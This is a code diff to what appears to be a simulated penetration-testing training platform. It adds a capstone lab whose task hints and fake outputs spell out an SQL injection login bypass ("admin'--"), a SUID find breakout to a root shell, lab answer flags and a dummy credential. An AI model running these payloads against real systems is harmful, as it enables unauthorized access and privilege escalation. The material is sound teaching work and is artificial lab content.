@@ -1548,6 +1548,124 @@ Remediation Flag: flag{aes_gcm_authenticated_encryption}`
           successNote: "Defensive cryptography flag verified: flag{aes_gcm_authenticated_encryption}."
         }
       ]
+    },
+
+    // -----------------------------------------------------------------------
+    // LAB 13: Capstone Pentest: Final Enterprise Target
+    // -----------------------------------------------------------------------
+    'lab-capstone': {
+      id: 'lab-capstone',
+      num: '13',
+      title: 'Capstone Pentest: Final Enterprise Target',
+      targetHost: '10.10.10.100',
+      targetPort: '22 (SSH) / 80 (HTTP)',
+      initialUser: 'cadet',
+      initialDir: '/home/cadet',
+      allowedTools: ['nmap', 'curl', 'cat', 'ls', 'whoami', 'id', 'pwd', 'find', 'grep', 'clear', 'help'],
+      initialFiles: {
+        '/home/cadet/notes.txt': {
+          type: 'file',
+          mode: 0o644,
+          owner: 'cadet',
+          group: 'cadet',
+          content: `Capstone Engagement Rules of Engagement:
+Target: 10.10.10.100
+Scope: Authorized enterprise security penetration test.
+Phase 1: Reconnaissance (Nmap port scan)
+Phase 2: Web API discovery & fuzzing
+Phase 3: SQL injection exploitation
+Phase 4: SSH initial foothold access
+Phase 5: SUID binary enumeration & privilege escalation
+Phase 6: Executive reporting & final flag retrieval`
+        },
+        '/home/cadet/user.txt': {
+          type: 'file',
+          mode: 0o644,
+          owner: 'cadet',
+          group: 'cadet',
+          content: 'flag{cadet_initial_foothold_access_2026}'
+        },
+        '/root/root.txt': {
+          type: 'file',
+          mode: 0o600,
+          owner: 'root',
+          group: 'root',
+          content: 'flag{endlessus_capstone_certified_junior_pentester_2026}\n[+] Certification Confirmed: Endlessus Certified Junior Penetration Tester.'
+        },
+        '/root/report.txt': {
+          type: 'file',
+          mode: 0o600,
+          owner: 'root',
+          group: 'root',
+          content: `Executive Remediation Report:
+1. Critical: Input concatenation on /api/v2/auth permitted SQL injection.
+   Remediation: Implement parameterized prepared statements.
+2. High: SUID bit enabled on /usr/bin/find permitted privilege escalation to root.
+   Remediation: chmod u-s /usr/bin/find.
+3. Verification Flag: flag{endlessus_capstone_certified_junior_pentester_2026}`
+        }
+      },
+      tasks: [
+        {
+          id: 'recon-nmap',
+          title: 'Phase 1: Recon & Nmap Scan',
+          validate: (cmd, ast) => {
+            return ast.executable === 'nmap' && (cmd.includes('10.10.10.100') || cmd.includes('22') || cmd.includes('80'));
+          },
+          syntaxHint: "Scan target: 'nmap -sV -p 22,80 10.10.10.100'",
+          successNote: "Open ports discovered: 22/tcp (SSH OpenSSH 8.9), 80/tcp (HTTP Node.js Express)."
+        },
+        {
+          id: 'directory-fuzzing',
+          title: 'Phase 2: Directory Fuzzing & API Discovery',
+          validate: (cmd, ast) => {
+            return ast.executable === 'curl' && cmd.includes('/api/v2/auth');
+          },
+          syntaxHint: "Query API: 'curl http://10.10.10.100/api/v2/auth'",
+          successNote: "Hidden administrative login gateway located at /api/v2/auth."
+        },
+        {
+          id: 'sqli-exploitation',
+          title: 'Phase 3: SQLi Exploitation & Auth Bypass',
+          validate: (cmd, ast) => {
+            if (ast.executable !== 'curl') return false;
+            const payload = String(ast.options.d || ast.options.data || cmd);
+            const hasSqli = (payload.includes("admin'") || payload.includes("admin\\'") || payload.includes("admin%27")) &&
+                            (payload.includes('--') || payload.includes('#') || payload.toLowerCase().includes('or'));
+            return cmd.includes('/api/v2/auth') && hasSqli;
+          },
+          syntaxHint: "Exploit SQLi: curl -X POST -d \"user=admin'--&pass=x\" http://10.10.10.100/api/v2/auth",
+          successNote: "Authentication bypassed! Admin session token and SSH credential hint retrieved."
+        },
+        {
+          id: 'user-foothold',
+          title: 'Phase 4: SSH Initial Foothold & User Flag',
+          validate: (cmd, ast) => {
+            return (ast.executable === 'cat' && cmd.includes('user.txt')) || cmd.includes('ssh cadet@10.10.10.100');
+          },
+          syntaxHint: "Inspect user flag: 'cat user.txt' or 'cat /home/cadet/user.txt'",
+          successNote: "Initial access verified! User flag retrieved: flag{cadet_initial_foothold_access_2026}."
+        },
+        {
+          id: 'suid-privesc',
+          title: 'Phase 5: SUID Privilege Escalation',
+          validate: (cmd, ast, out, session) => {
+            return Boolean(session.isElevatedRoot) && (cmd.includes('find') || cmd.includes('/bin/sh'));
+          },
+          syntaxHint: "Escalate privileges: 'find . -exec /bin/sh -p \\; -quit'",
+          successNote: "Root shell spawned via SUID find breakout! Effective UID is now 0 (root)."
+        },
+        {
+          id: 'root-flag',
+          title: 'Phase 6: Executive Reporting & Root Flag',
+          validate: (cmd, ast, out, session) => {
+            const readsRoot = ast.executable === 'cat' && (cmd.includes('root.txt') || cmd.includes('report.txt'));
+            return Boolean(session.isElevatedRoot) && (readsRoot || cmd.includes('flag{endlessus_capstone_certified_junior_pentester_2026}'));
+          },
+          syntaxHint: "Read root flag: 'cat /root/root.txt'",
+          successNote: "Capstone complete! Final certification flag verified: flag{endlessus_capstone_certified_junior_pentester_2026}."
+        }
+      ]
     }
   };
 
@@ -1564,7 +1682,8 @@ Remediation Flag: flag{aes_gcm_authenticated_encryption}`
     'lab-logs': ['flag{failed_ssh_brute_force_192_168_1_50}', '192.168.1.50', 'failed password', 'ssh brute force', 'brute force'],
     'lab-suid': ['flag{suid_find_root_euid0}', 'find . -exec /bin/sh -p', '/bin/sh -p', 'find -exec', 'euid=0'],
     'lab-jwt': ['flag{none_algorithm_signature_verification}', 'none', 'alg: none', 'hs256', 'signature'],
-    'lab-crypto': ['flag{aes_gcm_authenticated_encryption}', 'aes-256-gcm', 'aes-gcm', 'gcm', 'authenticated encryption']
+    'lab-crypto': ['flag{aes_gcm_authenticated_encryption}', 'aes-256-gcm', 'aes-gcm', 'gcm', 'authenticated encryption'],
+    'lab-capstone': ['flag{endlessus_capstone_certified_junior_pentester_2026}', 'capstone', 'junior pentester', 'certified junior pentester']
   };
 
   // =========================================================================
@@ -1702,7 +1821,7 @@ Remediation Flag: flag{aes_gcm_authenticated_encryption}`
       }
 
       // Check target scope
-      const validTargets = ['10.10.20.15', '10.10.110.45', '10.10.110.100', 'staging.acmefin.local', '127.0.0.1', 'localhost'];
+      const validTargets = ['10.10.20.15', '10.10.110.45', '10.10.110.100', '10.10.10.100', 'staging.acmefin.local', '127.0.0.1', 'localhost'];
       if (!validTargets.includes(target)) {
         return {
           exitCode: 1,
@@ -1715,7 +1834,11 @@ Remediation Flag: flag{aes_gcm_authenticated_encryption}`
 
       // Filter ports if -p was provided
       let portsOutput = '';
-      if (specifiedPort === '21') {
+      if (target === '10.10.10.100') {
+        portsOutput = `PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Node.js Express 4.18 (Production API Gateway)`;
+      } else if (specifiedPort === '21') {
         if (hasVersion) {
           portsOutput = 'PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4 (Backdoor CVE-2011-2523)';
         } else {
@@ -2024,6 +2147,37 @@ Content-Type: application/json
         }
       }
 
+      // Lab 13: Capstone Pentest
+      if (session.labId === 'lab-capstone') {
+        if (targetUrl.includes('/api/v2/auth')) {
+          if (dataPayload.includes("admin'") || dataPayload.includes("admin\\'") || dataPayload.includes("admin%27")) {
+            return {
+              exitCode: 0,
+              stdout: `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"status":"authenticated","user":"admin","token":"flag{sqli_bypass_auth_v2_ok}","ssh_credential_hint":"cadet:Winter2026!","message":"Administrative authentication successful. Credentials granted for local user cadet."}`
+            };
+          }
+          if (dataPayload) {
+            return {
+              exitCode: 0,
+              stdout: `HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+
+{"status":"failed","error":"Invalid credentials."}`
+            };
+          }
+          return {
+            exitCode: 0,
+            stdout: `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"endpoint":"/api/v2/auth","method":"POST","parameters":["user","pass"],"hint":"Internal administrative gateway."}`
+          };
+        }
+      }
+
       return {
         exitCode: 0,
         stdout: `HTTP/1.1 200 OK\nHost: ${targetUrl}\nContent-Length: 512\n\n[Endpoint active. Review lab tasks for specific payloads.]`
@@ -2161,13 +2315,23 @@ Content-Type: application/json
 
       // GTFOBins SUID Breakout
       if (hasExec) {
-        if (session.labId === 'lab-suid') {
-          session.isElevatedRoot = true;
-          session.user = 'root';
-          session.euid = 0;
+        const hasP = raw.includes('-p') || (ast.args && ast.args.includes('-p'));
+        if (hasP) {
+          if (session.labId === 'lab-suid' || session.labId === 'lab-capstone') {
+            session.isElevatedRoot = true;
+            session.user = 'root';
+            session.euid = 0;
+            const host = session.labId === 'lab-capstone' ? 'corp-target' : 'sec-station';
+            const nextFlag = session.labId === 'lab-capstone' ? '/root/root.txt' : '/root/flag.txt';
+            return {
+              exitCode: 0,
+              stdout: `# Spawning elevated shell via /usr/bin/find -exec...\nroot@${host}:~# whoami\nroot (uid=1001 euid=0(root) gid=1001 groups=0(root))\n[✓] Privilege boundary bypassed. You now hold EUID=0 permissions. Run 'cat ${nextFlag}'.`
+            };
+          }
+        } else {
           return {
             exitCode: 0,
-            stdout: `# Spawning elevated shell via /usr/bin/find -exec...\nroot@sec-station:~# whoami\nroot (uid=1001 euid=0(root) gid=1001 groups=0(root))\n[✓] Privilege boundary bypassed. You now hold EUID=0 permissions. Run 'cat /root/flag.txt'.`
+            stdout: `find: notice: spawned subshell without -p; effective root privileges dropped (EUID=1001).\nUse '-p' to preserve EUID 0 privileges in GTFOBins breakout.`
           };
         }
       }
@@ -2796,13 +2960,19 @@ ${spec.tasks.map((t, idx) => `  [Task ${idx + 1}] ${t.title}`).join('\n')}`
         }
       }
 
-      // Objective Validation (No Cascading — Every Task Verified Directly)
+      // Objective Validation (Strict POSIX Execution & Non-Zero Error Rejection)
       const newlyCompleted = [];
       const primaryAst = parsed.commands[0];
 
       spec.tasks.forEach((task, index) => {
         if (!session.completedTasks.has(index)) {
-          const isDone = task.validate(cleanRaw, primaryAst, finalStdout || finalStderr || '', session);
+          // Reject task completion if the primary command exited with an error,
+          // UNLESS the specific task explicitly allows non-zero exit code (e.g. grep finding no HSTS header)
+          if (lastExitCode !== 0 && !task.allowNonZeroExit) {
+            return;
+          }
+
+          const isDone = task.validate(cleanRaw, primaryAst, finalStdout || finalStderr || '', session, parsed, lastExitCode, finalStderr);
           if (isDone) {
             session.completedTasks.add(index);
             newlyCompleted.push({
